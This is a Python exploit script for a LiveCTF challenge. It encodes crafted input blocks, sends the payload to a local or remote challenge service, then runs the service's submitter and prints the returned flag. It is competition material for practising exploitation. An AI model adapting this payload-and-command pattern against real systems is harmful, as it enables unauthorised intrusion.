from time import sleep
from ptrlib import *

LOCAL = "LOCAL" in sys.argv

BIN_NAME = ["python3", '../handout/challenge.py']
REMOTE_ADDR = os.environ.get('HOST', 'localhost')
REMOTE_PORT = 31337
REMOTE_LIBC_PATH = 'libc.so.6'

if LOCAL: stream = process(BIN_NAME)
else: stream = remote(REMOTE_ADDR, REMOTE_PORT)

def enc_block(esi, block):
  assert len(block) == 10
  ret = b''
  for c in block:
    ret += p8((c+esi) & 0xff)
  return ret

USED_BLOCKS = {}
def register_block(idx, block):
  if idx in USED_BLOCKS:
    print(f"{idx} used")
    assert False

  assert len(block) == 10
  USED_BLOCKS[idx] = block

def register_after_enc(idx, esi, block):
  enced = enc_block(esi, block)
  register_block(idx, enced)

def finalize():
  ret = b''
  for i in range(100):
    if i in USED_BLOCKS:
      assert len(USED_BLOCKS[i]) == 10
      ret += USED_BLOCKS[i]
    else :
      ret += b'U' * 10
  return ret

register_after_enc(0, 0, b'A'*4 + p16(1) + b'A'*4)
register_after_enc(1, 0, b'\x04fUzZ?tHiS')
register_after_enc(0x41, 1, b'\x4013371337\x00')
register_after_enc(0x27, 2, b'\x80' + p32(2**31) + p32(2**31) + b'\x00')
register_after_enc(0xc,  3, b'\x10'+b'\x55'*9)
register_after_enc(0x9,  4, b'\x01' + b'\xff'*7 + p16(1))

payload = finalize()
stream.sendline(payload)

if LOCAL:
  stream.interactive()
else:
  sleep(1)
  stream.sendline(b"./submitter")
  while True:
    try:
      flag = stream.recvline()
      print(flag)
      if b'LiveCTF{' not in flag: continue
      print(flag.strip().decode())
      break
    except Exception as e:
      print(e)
